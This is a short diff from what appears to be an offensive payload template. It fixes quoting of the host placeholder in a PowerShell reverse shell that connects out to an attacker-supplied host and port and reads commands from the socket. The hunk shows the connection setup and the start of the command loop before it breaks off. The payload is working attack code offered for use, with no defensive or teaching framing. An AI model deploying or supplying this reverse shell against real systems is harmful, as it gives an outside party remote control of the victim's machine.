@@ -7,7 +7,7 @@ Options:
     port: "Port for reverse shell (Ex. 1234)"
 ##########
 
-$client = New-Object System.Net.Sockets.TCPClient({{host}},{{port}});
+$client = New-Object System.Net.Sockets.TCPClient("{{host}}",{{port}});
 $stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
